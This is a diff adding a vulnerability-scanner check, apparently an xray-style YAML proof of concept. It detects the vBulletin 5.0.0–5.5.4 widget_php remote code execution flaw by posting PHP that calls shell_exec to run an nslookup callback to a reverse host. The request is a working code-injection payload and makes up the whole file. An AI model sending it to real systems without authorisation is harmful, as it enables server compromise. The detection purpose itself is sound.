@@ -1,0 +1,15 @@
+name: poc-yaml-vbulletion5-rce
+rules:
+  - method: POST
+    path: /
+    body: >-
+      routestring=/ajax/render/widget_php&widgetConfig[code]=echo%20shell_exec('nslookup%20{{reverse_domain}}%20{{reverse_ip}}');%20exit;
+    follow_redirects: false
+    expression: |
+      status_code==200 && waitReverse(5)
+
+detail:
+  author: JingLing(https://hackfun.org/)
+  vbulletion_version: 5.0.0 - 5.5.4
+  links:
+    - https://securityaffairs.co/wordpress/91689/hacking/unpatched-critical-0-day-vbulletin.html
